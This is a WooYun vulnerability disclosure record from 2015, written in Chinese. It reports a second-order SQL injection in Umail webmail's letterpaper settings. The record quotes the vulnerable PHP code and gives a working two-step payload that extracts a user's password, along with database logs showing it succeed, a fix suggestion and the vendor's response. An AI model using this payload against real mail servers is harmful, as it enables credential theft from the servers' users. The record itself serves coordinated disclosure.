{"id": 31035, "wybug_id": "wooyun-2015-099668", "wybug_title": "Umail最新版1处二次注入", "wybug_corp": "Umail", "wybug_author": "玉林嘎", "wybug_date": "2015-03-09 11:48", "wybug_open_date": "2015-06-11 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向公众公开  简要描述： rt 详细说明：  win2003 默认安装 最新版漏洞文件:/client/option/module/o_letterpaper.php\nif ( ACTION == \"letterpaper-set\" ){\t\t\t\t$url = make_link( \"option\", \"view\", \"letterpaper\" );\t\t\t\t$lp_id = intval( gss( $_POST['id'] ) );\t\t\t\t .....\t\t\t\tif ( gss( $_POST['padding'] ) )\t\t\t\t{\t\t\t\t\t\t\t\t$style .= \"padding:\".gss( $_POST['padding'] ).\";\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$style .= \"padding:20px 30px;\";\t\t\t\t}\t\t\t\tif ( $lp_id )\t\t\t\t{\t\t\t\t\t\t\t\t$where = \"id='\".$lp_id.\"'\";\t\t\t\t\t\t\t\t$lp_info = $Widget->getone_letterpaper( $where, \"*\", 0 );\t\t\t\t\t\t\t\tif ( gss( $_POST['bgImgPath'] ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$suffix = fileext( $_POST['bgImgPath'] );\t\t\t\t\t\t\t\t\t\t\t\tcheck_upload_suffix( $suffix );\t\t\t\t\t\t\t\t\t\t\t\t$bgimg = WEBMAIL_URL.\"resource/images/letterpaper/\".$lp_id.\".\".$suffix;\t\t\t\t\t\t\t\t\t\t\t\t$thumb = WEBMAIL_URL.\"resource/images/letterpaper/thumbnail/\".$lp_id.\".\".$suffix;\t\t\t\t\t\t\t\t\t\t\t\t$style .= \"background-image:url(\".$bgimg.\");\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse if ( !gss( $_POST['bgImgUrl'] ) ) //第一次从这里进入插入注入代码\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$thumb = gss( $_POST['bgColor'] ) ? \"background-color:\".gss( $_POST['bgColor'] ) : \"background-color:#fff\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$thumb = $lp_info['thumbnail'];  // 第二次进入这里 从上面查询出来的赋予$thumb\t\t\t\t\t\t\t\t\t\t\t\t$style .= \"background-image:\".gss( $_POST['bgImgUrl'] ).\";\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$letterpaper_new = str_replace( \"%s\", $style, $letterpaper );\t\t\t\t\t\t\t\t$data = array(\t\t\t\t\t\t\t\t\t\t\t\t\"letterpaper\" => $letterpaper_new,\t\t\t\t\t\t\t\t\t\t\t\t\"thumbnail\" => $thumb\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$where = \"id='\".$lp_id.\"'\";\t\t\t\t\t\t\t\t$res = $Widget->update_letterpaper( $data, $where, 0 );//进入更新\n第一次更新 我们用于二次注入的代码 xx',`thumbnail`=(SELECT password from userlist where userid=2)#第二次让它把之前更新的代码重新查询出来 赋予给$thumb 再次进入更新   漏洞证明：  漏洞证明:需要个umail账号第一步：访问http://192.168.106.137/webmail/client/option/index.php?module=operate&action=letterpaper-setpost:id=1&bgColor=xx',`thumbnail`=(SELECT password from userlist where userid=2)#\n\n操作日志：\n150305 15:45:38\t  195 Connect\tumail@localhost on \t\t  195 Query\tSET NAMES 'UTF8'\t\t  195 Init DB\tumail\t\t  195 Query\tSELECT * FROM letterpaper WHERE id='1' LIMIT 1\t\t  195 Query\tUPDATE letterpaper SET `letterpaper`='<div id=\"lp_wrap\" style=\"background-color:xx\\',`thumbnail`=(SELECT password from userlist where userid=2)#;padding:20px 30px;\"><div id=\"lp_wrap_content\"></div></div>',`thumbnail`='background-color:xx\\',`thumbnail`=(SELECT password from userlist where userid=2)#' WHERE id='1'\t\t  195 Quit\n第二步：访问http://192.168.106.137/webmail/client/option/index.php?module=operate&action=letterpaper-setpost:id=1&bgImgUrl=xx\n\n操作日志：\n150305 15:47:41\t  196 Connect\tumail@localhost on \t\t  196 Query\tSET NAMES 'UTF8'\t\t  196 Init DB\tumail\t\t  196 Query\tSELECT * FROM letterpaper WHERE id='1' LIMIT 1\t\t  196 Query\tUPDATE letterpaper SET `letterpaper`='<div id=\"lp_wrap\" style=\"padding:20px 30px;background-image:xx;\"><div id=\"lp_wrap_content\"></div></div>',`thumbnail`='background-color:xx',`thumbnail`=(SELECT password from userlist where userid=2)#' WHERE id='1'\t\t  196 Quit\n成功update最后直接访问http://192.168.106.137/webmail/client/option/index.php?module=operate&action=letterpaper-set查看源文件\n\n   修复方案：  出库过滤   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-13 15:09 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}